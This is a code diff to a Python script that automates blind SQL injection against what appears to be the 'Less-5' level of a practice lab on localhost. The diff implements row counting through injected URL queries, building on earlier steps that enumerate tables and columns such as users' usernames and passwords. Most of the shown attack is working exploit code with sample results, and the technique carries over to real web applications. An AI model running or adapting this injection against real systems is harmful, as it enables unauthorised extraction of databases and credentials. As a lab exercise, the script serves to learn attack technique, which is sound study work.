@@ -146,12 +146,11 @@ def get_column_num(table_name_list: List, pattern: str) -> Dict[str, int]:
         print(f'The column num had been got: {column_num_dict}')
     return column_num_dict
 
-# TODO
-def get_able_and_column_info(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
-    # eg.{'users': {3: [2, 8, 8]}}
-    # users: table name
-    # 3: column number
-    # [2, 8, 8]: every column len
+def get_table_and_column_info(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
+    # column_name_len_dict: eg.{'users': {3: [2, 8, 8]}}
+    # users: the table name
+    # 3: the column number
+    # [2, 8, 8]: every column name length
     column_name_len_dict: Dict[str, Dict[int, List[int]]] = {}
     for table_name, table_colmun_num in column_num_dict.items():
         temp_column_name_len: int = 1
@@ -171,6 +170,11 @@ def get_able_and_column_info(column_num_dict: Dict[str, int], pattern: str) -> D
     return column_name_len_dict
 
 def get_column_name(pattern: str, table_and_column_info_dict: Dict[str, Dict[int, List[int]]]) -> Dict[str, List[str]]:
+    # table_and_column_dict: eg.{'users': ['id', 'username', 'password']}
+    # users: the table name
+    # id: the first column name
+    # username: the second column name
+    # password: the third column name
     table_and_column_dict: Dict[str, List[str]] = {}
     for table_name, column_info_dict in table_and_column_info_dict.items():
         temp_column_name_list: List = []
@@ -198,16 +202,26 @@ def get_column_name(pattern: str, table_and_column_info_dict: Dict[str, Dict[int
     return table_and_column_dict
 
 # TODO
-def get_data_num(table_name_list: List[str], pattern: str) -> Dict[str, int]:
+def get_data_num(table_and_column_dict: Dict[str, List[str]], pattern: str) -> Dict[str, int]:
     data_num_dict: Dict[str, int] = {}
-    for table_name in table_name_list:
+    for table_name, column_list in table_and_column_dict.items():
         data_num: int = 0
+        the_first_column_name: str = column_list[0]
         while True:
-            url_str: str = f"/Less-5/?id=1' and length((select group_concat(id) from emails)) - length((select replace(group_concat(id), ',', '') from emails))=7"
-            url_str = SQL_COMMENT + url_str + SQL_COMMENT
+            # 1.Note that `ifnull(...,'')` will be return '' if the table is empty, then `length(ifnull(...,''))` will be return 0
+            # 2.Note that `%2B` will be translated to `+` by browse
+            url_str: str = f"/Less-5/?id=1' and length(ifnull((select group_concat({the_first_column_name}) from {table_name}),'')) - length(ifnull((select replace(group_concat({the_first_column_name}), ',', '') from {table_name}),'')) %2B 1 = {data_num}"
+            url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
             print(f'Try to get the data num: {url_str}')
-            pass
-    return {}
+            if get_method(url=url_str, pattern=pattern):
+                # table is empty when `get_method` return true and data_num equal with 1
+                if data_num == 1:
+                    data_num_dict[table_name] = 0
+                else:
+                    data_num_dict[table_name] = data_num
+                break
+            data_num = data_num + 1
+    return data_num_dict
 
 def get_data_len() -> None:
     url_str: str = f"http://localhost:8001/Less-5/?id=1' and length((select email_id from emails limit 0,1)) = 16--+"
@@ -237,11 +251,14 @@ table_name_list: List = get_table_name(pattern='You are in', table_name_len_list
 print(f'The table name list: {table_name_list}\n\n')
 column_num_dict: Dict[str, int] = get_column_num(table_name_list=table_name_list, pattern='You are in')
 print(f'The column num dict: {column_num_dict}\n\n')
-table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_able_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
+table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_table_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
 print(f'The column name len dict: {table_and_column_info_dict}\n\n')
-table_and_column_name_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
+table_and_column_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
 # {'emails': ['id', 'email_id'], 
 # 'referers': ['id', 'referer', 'ip_address'], 
 # 'uagents': ['id', 'uagent', 'ip_address', 'username'], 
 # 'users': ['id', 'username', 'password']}
-print(f'The table name and column name dict: {table_and_column_name_dict}')
+print(f'The table name and column name dict: {table_and_column_dict}\n\n')
+table_and_data_num: Dict[str, int] = get_data_num(table_and_column_dict=table_and_column_dict, pattern='You are in')
+# The data num list: {'emails': 8, 'referers': 0, 'uagents': 0, 'users': 13}
+print(f'The data num list: {table_and_data_num}\n\n')
